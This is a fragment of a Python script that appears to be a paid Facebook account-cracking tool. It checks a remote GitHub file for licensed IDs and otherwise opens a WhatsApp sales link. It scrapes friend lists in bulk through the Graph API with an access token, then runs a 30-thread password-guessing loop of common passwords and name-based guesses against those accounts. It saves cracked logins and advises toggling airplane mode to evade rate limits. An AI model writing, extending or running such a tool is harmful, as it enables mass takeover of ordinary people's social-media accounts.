...
def chk():
  ...
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/ofoncity01/TFF/main/server.txt").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open  https://wa.me/2347065038470?text=*Hello*%2C%20*Josh*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*PAY*%20*UPDATED*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def dump_publik():
	...
	try:
		koh2 = requests.get('https://graph.facebook.com/v13.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] ENTER ID NUMBER (LIMIT 10)')
	try:
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v13.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
...
def passwrd():
	...
	krek = 'Live Results Saved To : OK/%s\nCheck Result Saved To : CP/%s\nTurn on/your Airplane Mode Every 5 Minutes'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['112233','445566','556677','223344','787898','102030','123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
